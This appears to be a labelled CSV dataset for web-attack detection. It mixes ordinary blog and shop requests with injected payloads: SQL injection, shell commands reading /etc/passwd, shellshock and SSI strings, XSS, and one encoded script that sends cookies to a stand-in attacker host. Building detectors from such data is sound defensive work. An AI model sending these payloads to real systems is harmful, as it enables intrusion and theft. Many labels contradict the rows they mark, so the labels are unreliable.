text,label
/blog/index.php/2020/04/04/explicabo-qui-fuga-distinctio-dolores-voluptatibus-sit%7Ccat+%2Fetc%2Fpasswd%23/embed,0
/blog+where+0+in+%28select+sleep%2815%29+%29+--+/wp-content/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a-300x239.png,1
/blog/wp-includes/js/media-views.min.js.bz2,0
/blog/wp-login.php%26sleep+15%26?action=register user_login=enragedWigeon7&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,1
/135909/,0
/javascript/folders.o,0
/blog/wp-content/uploads/2020%26cat+%2Fetc%2Fpasswd%26/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3-1024x682.jpg,0
/blog/index.php%3B/page/4?s,1
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/embed,1
/blog/index.php/my-account/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,0
/blog/wp-content/%00/2020/04/6182beef-7947-3c05-887f-c6de1c49f824.png,0
/blog/%7C/my-account username=rafael&password=espa%C3%B1a01&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2F&login=Login&redirect=,0
/blog/index.php%3Bsleep+15%3B/page/4?s,1
/blog/wp-content/themes/twentyseventeen%22%26cat+%2Fetc%2Fpasswd%26%22/assets/js/global.js?ver=1.0,0
/blog/index.php/my-account/edit-profile/%7B%7B+data.model.url%27+OR+%271%27%3D%271,1
/blog/wp-admin%26%26cat+%2Fetc%2Fpasswd/images/browser.png,0
/blog/index.php/2020/03%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/27/qui-ratione-maxime-dolores-consequatur/feed,1
/blog/wp-includes/%5Cwp-plupload.min.js/plupload/wp-plupload.min.js?ver=4.9.5,0
/blog/index.php/fugiat-recusandae-voluptatem-ratione-quo-placeat%25%27++--+/feed,1
/blog/index.php/my-account/edit-profile%2Bor%2B0%2Bin%2B%2528select%2Bsleep%252815%2529%2B%2529%2B--%2B/%7B%7B%20attachment.url,1
/blog/c%3A%5C/plugins/user-registration/assets/css/my-account-layout.css?ver=1.8.2.1,0
/blog/index.php/2020/03/27%27+AND+%28SELECT+1358+FROM%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%281358%3D1358%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x%29a%29+AND+%27SOZu%27%3D%27SOZu/qui-ratione-maxime-dolores-consequatur,1
/blog/index.php%22+%2F+sleep%2815%29+%2F+%22/tag/nihil-alias-ab/feed,0
/blog/c%3A%2F/search/failure/feed/rss2,0
/blog/index.php/HtTpS%3A%2F%2F8501779237819759495.owasp.org/04/04/consequatur-ad-error-quidem/feed,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed%27%29+UNION+ALL+SELECT+NULL--+-,1
/rh_promo/,0
"/tienda1/publico/registro.jsp?modo=registro&login=zander&password=arca�sta&nombre=zain&apellidos=espriella+morcossessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&email=skala@lamarsrl.la&dni=28264646s&direccion=nardo,+106,+7-h&ciudad=torrecampo&cp=46315&provincia=alicante&ntc=5436324330428646&b1=registrar",1
/sb116554644105044275/,0
/blog/index.php/my-account/edit-profile/post.php/?action=edit&post=%7B%7B%20data.id%20%7D%7D username=amazedSnipe8&password=gcStn%22+AND+%221%22%3D%222%22+--+&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever,1
/javascript/test123.pl,0
/blog/wp-content/uploads/2020/%40/d2ac875b-15d8-3412-9205-17afbf0ba62d-1024x682.jpg,0
/blog%3B/index.php/tag/at-quos-nesciunt-in-amet/feed,1
/blog%25/wp-comments-post.php comment=&submit=Post+Comment&comment_post_ID=56&comment_parent=0,0
/tienda1/miembros/editar.jsp?modo=registro&login=karhunie&password=garrofal&nombre=elbio&apellidos=calvillo&email=saint-cyr@cenitsoria.tg&dni=51920905s&direccion=passatge+del+mercat+18+&ciudad=vici�n&cp=29551&provincia=lleida&ntc=3302749749837576&b1=registrar,0
/%5Cut-aspernatur-est-dolores/index.php/sample-page/ut-aspernatur-est-dolores,0
/002148/,0
/blog/https%3A%2F%2F8501779237819759495.owasp.org/2020/04/04/rerum-soluta-et-quis-excepturi-labore/embed,0
/%22%27/index.php,1
/blog/Set-cookie%3A+Tamper%3Da95f4e6b-cba6-4682-898b-f87234f69f54/js/plupload/moxie.min.js?ver=1.3.5,0
/blog/index.php/2020%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/blog/index.php%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed,1
/%29/wp-content/plugins/user-registration/assets/js/frontend/lost-password.min.js?ver=1.8.2.1,1
/blog%7C%7Ccat+%2Fetc%2Fpasswd/wp-content/plugins/user-registration/assets/js/frontend/my-account.min.js?ver=1.8.2.1,0
/%5C%5C8501779237819759495.owasp.org/wp-includes/js/wp-embed.min.js?ver=4.9.5,0
/blog%27%3Bcat+%2Fetc%2Fpasswd%3B%27/index.php/registration/embed,0
/blog%22%3Bsleep+15%3B%22/index.php/sample-page/feed,1
/blog/c%3A%2F/aut-velit-dicta-eaque,0
"/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332009307','5'--",1
/%2F/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur,0
/blog%27+or+0+in+%28select+sleep%2815%29+%29+--+/index.php/registration first_name=ZAP&user_login=guiltyThrushe4&user_pass=ZAP&user_confirm_password=*#LK-Y3&last_name=ZAP&user_email=foo-bar%40example.com&user_confirm_email=foo-bar%40example.com&ur-user-form-id=97&ur-redirect-url=&ur_frontend_form_nonce=371e07a3bf,1
/blog/index.php%22%26cat+%2Fetc%2Fpasswd%26%22/2020/03,0
/blog+and+0+in+%28select+sleep%2815%29+%29+--+/index.php/2020/04/04/hic-porro-nihil-non-rerum,1
/blog/wp-content/themes/twentyseventeen0W45pz4p/assets/js/html5.js?ver=3.7.3,0
/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=91&b1=a�adir+al+carrito,0
/blog/index.php/zApPX1254sS/feed,0
/blog%3B/wp-content/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3-1024x682.jpg,1
"1') where 5071=5071 union all select null,null,null,null,null,null,null--",1
/blog/wp-content/uploads/2020/04%27+%2F+sleep%2815%29+%2F+%27/27f17687-adda-3ce6-9767-0037ea74eec2-300x240.png,0
/tienda1/miembros/editar.jsp?modo=registro&login=gie-ming&password=farsista&nombre=chiemi&apellidos=carcanoux&email=ackridge.placido@global-services.co&dni=16627836d&direccion=pedrera+195+12?e&ciudad=nava+de+sotrobal&cp=44390&provincia=m�laga&ntc=1764641302587974&b1=registrar,0
/blog/index.php/my-account/edit-profile/post.php/?action=edit&post=c%3A%2F,0
/blog/wp-includes/js%27%26cat+%2Fetc%2Fpasswd%26%27/backbone.min.js?ver=1.2.3,0
/blog/wp-content/plugins+OR+1%3D1/user-registration/assets/css/sweetalert2,1
/blog/index.php/2020%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/03/22,1
/blog/index.php/2020/04/04/animi-sint-ut-sed-commodi%25%27++--+/feed,1
/blog/index.php%25%27%29%3B%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29rWmO%29+AND+%28%27%25%27%3D%27/2020/03/29/distinctio-sequi-officiis-occaecati,1
/blog/index.php/my-account/edit-profile/post.php/?action=edit&post=%7B%7B+data.id+%7D%7D%27+UNION+ALL+select+NULL+--+ username=somberSeagull3&password=*0LLp2&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever,1
/blog/%3B/tag/nihil-alias-ab,1
/blog/index.php/search/data/etc%2Fpasswd,0
/blog/index.php/tag%27+AND+%271%27%3D%271/hic-quod-et-odit,1
/blog/wp-content/http%3A%2F%2F8501779237819759495.owasp.org/user-registration/assets/css/my-account-layout.css?ver=1.8.2.1,0
/blog/index.php%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/22,1
/blog%27+AND+%271%27%3D%271/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=1.0,1
/blog%27%3B%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29khMi%29%23/index.php/2020/03/29/distinctio-sequi-officiis-occaecati,1
/blog+%2F+sleep%2815%29+/index.php/my-account/lost-password,0
almoga,0
/sb06-170/,0
/blog/index.php/%5C%5C8501779237819759495.owasp.org/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis/embed,0
/blog/wp-includes/js/imgareaselect%7C%7Ccat+%2Fetc%2Fpasswd/imgareaselect.css?ver=0.9.8,0
/blog/wp-content/themes/twentyseventeen%22%26cat+%2Fetc%2Fpasswd%26%22/assets/js/navigation.js?ver=1.0,0
/blog/wp-content%3Bsleep+15%3B/themes/twentyseventeen/assets/css/ie8.css?ver=1.0,1
/blog/index.php/accusantium-eveniet-rem-voluptatem/feed%7C%7Ccat+%2Fetc%2Fpasswd,0
/blog/c%3A%5C/author/rosenbaum-lisette/feed,0
/blog/wp-content/uploads/2020/04/ff237aac-eda3-37f9-8529-2cbfc90951b2-1024x682.bak.jpg,0
; str=$(echo qiikmd); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7c,1
/blog/wp-comments-post.php comment=&submit=URL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27&comment_post_ID=56&comment_parent=0,0
/blog/wp-content/%2Fetc%2Fpasswd/twentyseventeen/assets/js/navigation.js?ver=1.0,0
/blog/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js%7C%7Ccat+%2Fetc%2Fpasswd?ver=1.0,0
/blog/index.php/tag%22%3Bcat+%2Fetc%2Fpasswd%3B%22/autem-vel-nostrum-enim,0
/blog/index.php%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,1
/blog/index.php/2020/04/04/ipsa-ea-porro-distinctio%27%3Bcat+%2Fetc%2Fpasswd%3B%27/feed,0
/%2Fetc%2Fpasswd/wp-content/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702-300x240.png,0
/blog/index.php/2020XYZABCDEFGHIJ/04/04/rerum-soluta-et-quis-excepturi-labore,0
/%3B/index.php/author/rosenbaum-lisette,1
/blog/index.php/page/3%27+UNION+ALL+select+NULL+--+?s,1
/%2B/wp-admin/about.php,0
/blog/wp-content/uploads/2020/04%27%3Bcat+%2Fetc%2Fpasswd%3B%27/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg,0
/blog/%40/my-account/edit-password username=cautiousMacaw2&password=pK&Kvn&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,0
/blog/wp-content/plugins/user-registration/assets/%3B/frontend/user-registration.min.js?ver=1.8.2.1,1
/blog%27%3Bcat+%2Fetc%2Fpasswd%3B%27/wp-content/uploads/2020/04/7c651b11-3631-3f9e-b728-dc11efe811c7.png,0
/blog%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/index.php/2020/03/23,1
/http%3A%5C%5C8501779237819759495.owasp.org/index.php/2020/04/04/voluptas-alias-ut-iure-dicta-aliquid-corrupti/feed,0
/blog/wp-content/uploads/2020/04/814f0d47-97c4-3681-b8a4-2cd7f3a93119-1024x682.jpg.1,0
/zeitungen/,0
/tienda1/publico/pagar.jsp?modo=insertar&precio=6401&b1=confirmar,0
/blog/index.php/author/barton03/http%3A%2F%2F8501779237819759495.owasp.org,0
/blog%2525/index.php/my-account/edit-profile/%7B%7B%20data.uploadedToLink,1
/%28SELECT+%28CASE+WHEN+%284915%3D4612%29+THEN+4915+ELSE+4915*%28SELECT+4915+FROM+mysql.db%29+END%29%29/index.php/2020/03/27,1
/blog%27+%2F+sleep%2815%29+%2F+%27/index.php/rerum-ut-error-ex-dolores-rerum/feed,0
/blog/wp-content/themes/twentyseventeen/assets/js/global.js%22%3Bcat+%2Fetc%2Fpasswd%3B%22?ver=1.0,0
/blog/wp-content/plugins/%2Fetc%2Fpasswd/assets/js/inputmask,0
/blog/wp-admin%25%22++--+/images,1
/blog/index.php/2020%25%27+RLIKE+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29mQoH%29+AND+%27%25%27%3D%27/03/23,1
/blog/index.php/author%26%26cat+%2Fetc%2Fpasswd/sipes-nolan/feed,0
/blog/index.php/tag/nihil-alias-ab/feed%60cat+%2Fetc%2Fpasswd%60,0
/blog/wp-content/plugins/user-registration+AND+1%3D1+--+/assets/css/sweetalert2,1
/blog/index.php%25%27+RLIKE+%28SELECT+%28CASE+WHEN+%287845%3D4756%29+THEN+0x696e6465782e706870+ELSE+0x28+END%29%29+AND+%27%25%27%3D%27/2020/03/23,1
/participant-foundry/,0
/blog/index.php%27+%2F+sleep%2815%29+%2F+%27/search,0
/blog/wp-content%22%3Bsleep+15%3B%22/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702.png,1
/blog/Set-cookie%3A+Tamper%3D4e88ee03-3f2d-4621-87e0-93cf8227198a/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702-300x240.png,0
/guest_bloggerma/,0
/blog%27%29%3B%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29UYXT%29%23/index.php,1
/%2F%2F8501779237819759495.owasp.org/index.php/2020/04/04/animi-sint-ut-sed-commodi/embed,0
/blog/index.php/2020%2CROW%288626%2C9080%29%3E%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%288626%3D8626%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+%28SELECT+4904+UNION+SELECT+4997+UNION+SELECT+8030+UNION+SELECT+8148%29a+GROUP+BY+x%29/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog%25%27+PROCEDURE+ANALYSE%28EXTRACTVALUE%288286%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%288286%3D8286%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29+AND+%27%25%27%3D%27/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/emsbldg01_25pct/,0
/blog/wp-content/uploads/2020/%2F65521cc1-512f-3af5-a40c-ad52a8de6f29.png/65521cc1-512f-3af5-a40c-ad52a8de6f29.png,0
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%27+AND+SLEEP%285%29+AND+%27THBG%27%3D%27THBG,1
/blog/index.php/et-vel-qui-explicabo-autem-rerum-nisi/feed%22+OR+%221%22%3D%221,1
/blog/wp-content/uploads/2020/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.jpg,0
/tienda1/publico/autenticar.jsp?modo=entrar&login='+sa'ndip&pwd=traslaticia&remember=off&b1=entrar,1
/blog/wp-content/plugins+%2F+sleep%2815%29+/user-registration/assets/js/frontend/lost-password.min.js?ver=1.8.2.1,0
/blog/Set-cookie%3A+Tamper%3D1cf8008c-41d4-40f8-9c09-87c0d713610a/js/mediaelement/mediaelement-migrate.min.js?ver=4.9.5,0
/wp-comments-post.php/2379498188057266413.php,0
/tienda1/publico/autenticar.jsp?modo=entrar&login=edwin&pwd=limonar&remember=off&b1=entrar,0
/blog/wp-includes/js/jquery/ui.orig,0
/blog/wp-content/uploads/2020/040W45pz4p/f74331ba-6a7e-37cc-aefe-7026be7b0c0b.png,0
/blog/wp-includes/js/media-audiovideo.min.js%27%3Bsleep+15%3B%27?ver=4.9.5,1
/blog/%5D%5D%3E/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/itslogo/,0
/blog/index.php%25/tag/sapiente-blanditiis-quasi,0
/blog/wp-content/uploads/2020/04+UNION+ALL+select+NULL+--+/f51dfb19-3fe8-380e-91a6-3912fdae661e-300x200.jpg,1
/blog/index.php0W45pz4p/search/data/feed/rss2,0
/blog/wp-content%27+OR+%271%27%3D%271%27+--+/uploads/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-180x180.jpg,1
/blog/index.php%7C%7Csleep+15/search/feed,1
/blog/index.php/est-reiciendis-laboriosam-aperiam-adipisci-non/feed%22+AND+%221%22%3D%221,1
/blog/index.php+AND+1%3D1/tag/at-quos-nesciunt-in-amet/feed,1
/0321117425/,0
/blog/index.php/2020/03+AND+4599%3D1220--+bfeH/23/fuga-aut-recusandae-sed-dolor-quia/embed,1
/blog/wp-content/uploads/2020%7Ccat+%2Fetc%2Fpasswd%23/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-180x180.jpg,0
/blog%60cat+%2Fetc%2Fpasswd%60/wp-includes/js/backbone.min.js?ver=1.2.3,0
/blog/wp-content/uploads/2020/04/3cb6ff57-160b-3c64-8413-3927d651c714%20-%20Copy%20(3).png,0
/blog/wp-content/plugins/user-registration/assets/js%27%26cat+%2Fetc%2Fpasswd%26%27/inputmask,0
/tienda1/publico/pagar.jsp?modo=insertar&precio=4484&b1=confirmar,0
/blog/HtTp%3A%2F%2F8501779237819759495.owasp.org/fugiat-recusandae-voluptatem-ratione-quo-placeat,0
/blog/c%3A%2F?action=lostpassword,0
/blog%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/wp-comments-post.php comment=&author=aboardPolenta9&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=11&comment_parent=0,0
/blog/wp-content/uploads/2020NULL/04/38536cfd-4e8b-3340-b4c4-af387cc163a8.jpg,1
/blog/index.php/2020/03%25%27%29+AND+9633%3D9162+AND+%28%27%25%27%3D%27/29/distinctio-sequi-officiis-occaecati,1
/blog+AND+1%3D1+--+/index.php/2020/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat/embed,1
/intuithome/,0
/blog/index.php/2020%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/wp-content/uploads/%2Fetc%2Fpasswd/04/40ce1958-204f-369e-bc5a-32d63da4963f-300x240.png,0
tchjan-lian.quadflieg@comerciosdeaspe.se,0
/blog/wp-includes%25%22++--+/js,1
/blog/wp-content/plugins/user-registration/http%3A%5C%5C8501779237819759495.owasp.org/css/my-account-layout.css?ver=1.8.2.1,0
/blog/wp-content/plugins/%5C%5C8501779237819759495.owasp.org/assets/js/frontend/lost-password.min.js?ver=1.8.2.1,0
/blog/wp-content%27%3Bsleep+15%3B%27/themes/twentyseventeen,1
/blog%22+ORDER+BY+1--+-/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,1
/blog/wp-content/uploads/Set-cookie%3A+Tamper%3Da6ed5272-6153-46f8-aa7b-793b3a31dc3b/04/7eb06ef2-3782-3e6a-bb62-c705e86b2eee-300x200.jpg,0
/blog/index.php%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/29,1
/blog/wp-content/plugins/user-registration/assets/js/frontend/my-account.min.js%22+OR+%221%22%3D%221%22+--+?ver=1.8.2.1,1
/blog/index.php/tag/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15,0
/blog/wp-content/plugins/user-registration/assets/js%60sleep+15%60/jquery-tiptip,1
/blog/wp-content%22%26cat+%2Fetc%2Fpasswd%26%22/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.jpg,0
/blog/wp-includes/js/jquery%27/ui/sortable.min.js?ver=1.11.4,1
/blog/0W45pz4p/category/uncategorized/page/2,0
/camelmail/,0
/%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C/index.php/fugiat-recusandae-voluptatem-ratione-quo-placeat/feed,0
/blog/wp-content/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9-1024x682.jpg,0
/blog/index.php/2020%60cat+%2Fetc%2Fpasswd%60/04/04/voluptatum-reprehenderit-maiores-ab-sequi-quaerat,0
/blog/wp-content/uploads/2020/04+OR+1%3D1+--+/755e6d4b-39f2-3314-89a0-c9a4d1bc3143-1024x682.jpg,1
/tienda1/global/estilos.css/asf-logo-wide.gif.inc,1
/blog/index.php%26%26cat+%2Fetc%2Fpasswd/page,0
/tienda1/publico/pagar.jsp?modo=insertar&precio=6493&b1=pasar+por+caja/,1
/blog/wp-content/uploads+UNION+ALL+select+NULL+--+/2020/04/c88a75c6-b439-3e82-99dd-0aca7c568b15-1024x682.jpg,1
/blog/index.php%22+%2F+sleep%2815%29+%2F+%22/sample-page/nulla-quisquam-est-ut-nemo/feed,0
"/tienda1/miembros/editar.jsp?modo=registro&login=cullum&password=golorit0&nombre=le�n&apellidos=manjavacas+herrero&email=hellwig_dravic@chevrolet-volt.cz&dni=33713828z&direccion=c/+caballero+montesinos,+123,+&ciudad=bellmunt+d'urgell&cp=34129&provincia=navarra&ntc=7732206170893125&b1=registrar",0
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/embed,1
/blog/index.php/2020/03/29%25%27%29+RLIKE+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29DPCx%29+AND+%28%27%25%27%3D%27/distinctio-sequi-officiis-occaecati,1
/blog/index.php/2020%27+and+0+in+%28select+sleep%2815%29+%29+--+/04/04/ipsa-ea-porro-distinctio/embed,1
/blog%27%29%29+RLIKE+%28SELECT+%28CASE+WHEN+%282542%3D8149%29+THEN+0x626c6f67+ELSE+0x28+END%29%29+AND+%28%28%27JXqr%27%3D%27JXqr/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/index.php/wp-json%22+%2F+sleep%2815%29+%2F+%22/oembed/1.0/embed?format=xml&url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fvitae-dolores-quidem-possimus-aut-voluptatibus%2F,0
/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=5&b1=a�adir+al+carritoany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a,1
/blog/wp-content/uploads/2020+or+0+in+%28select+sleep%2815%29+%29+--+/04/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg,1
/blog/wp-content/uploads/2020/04+%2F+sleep%2815%29+/ca053e21-2e95-34b7-a64b-a8ef08169a27-1024x682.jpg,0
/blog/index.php_backup/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem,0
/blog/wp-content/plugins/user-registration/assets%26sleep%24mc+15%26/js/inputmask/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58,1
/blog/index.php/2020/04/04%22+AND+%221%22%3D%221/ipsa-repellat-dignissimos-laudantium/feed,1
/blog/index.php/my-account/edit-profile/%7B%7B+data.uploadedToLink%27%26cat+%2Fetc%2Fpasswd%26%27,0
/blog/index.php/2020/03%25%27+RLIKE+%28SELECT+%28CASE+WHEN+%284828%3D3579%29+THEN+03+ELSE+0x28+END%29%29+AND+%27%25%27%3D,1
/blog/index.php/2020/c%3A%5C/23,0
/blog/wp-login.php?action=register user_login=madWeaver5&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,0
/blog/wp-includes/js/media-models.min.0.js,0
/tienda1/global/titulo.jsp/asf-logo-wide.gif.bak,1
/blog/index.php%27+where+0+in+%28select+sleep%2815%29+%29+--+/tag/hic-enim-consequatur-minima-quibusdam-magnam,1
/peters_l/,0
/blog/wp-content/plugins/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/assets/js/inputmask,0
/blog/index.php%27+%2F+sleep%2815%29+%2F+%27/my-account/lost-password?reset-link-sent=true,0
/uzbekistan-hotels/,0
/%3C%21--/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem/feed,1
/blog/index.php%60sleep+15%60/page/2,1
"1' in boolean mode) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)#",1
"/tienda1/publico/registro.jsp?modo=registro&login=rappopor&password=safir&nombre=evergisto&apellidos=guiral+de+la+fuente&email=benfer@cor-jet.sj&dni=88705967g&direccion=calle+raya,+105,+4a&ciudad=paso,+el&cp=09348&provincia=cantabria&ntc=1397465400819949&b1=registrar",0
"/tienda1/publico/registro.jsp?modo=registro&login=lali8&password=e4cu3e387&nombre=febe&apellidos=masa+lapray&email=medvedier_goalen@citiway.dd&dni=97689208c&direccion=c/+sebastian+llano+20,+&ciudad=yebra&cp=26329&provincia=lugo&ntc=6471068296996496&b1=registrar",0
/blog/index.php%7C%7Ccat+%2Fetc%2Fpasswd/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed,0
